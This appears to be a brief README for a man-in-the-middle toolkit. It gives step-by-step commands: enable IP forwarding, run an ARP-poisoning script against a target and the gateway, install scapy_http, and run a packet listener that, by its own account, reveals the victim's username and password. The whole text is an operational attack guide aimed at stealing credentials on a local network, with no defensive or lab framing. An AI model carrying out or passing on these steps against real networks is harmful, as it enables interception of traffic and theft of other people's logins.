== Man in the middle ==

The first step of the Man in the Middle Attack is IP Forwarding. 
Therefore, the code shown below should be run before everything. 

==> echo 1 > /proc/sys/net/ipv4/ip_forward 

To use the arp_poison.py tool: 
Pyhton3 arp_poison.py -t {target+IP} -g {Modem+IP}


Before using the packet_listener, scapy_http package should be downloaded. To do this, type the following script into the terminal: 
==> pip3 install scapy_http 

After that, we need to send packets by using arp_poison.py; 
==>python3 arp_poison.py

then we can listen to the network by packet_listener.py
==> python3 packet_listener.py

Then, you can see the username and password of the user.
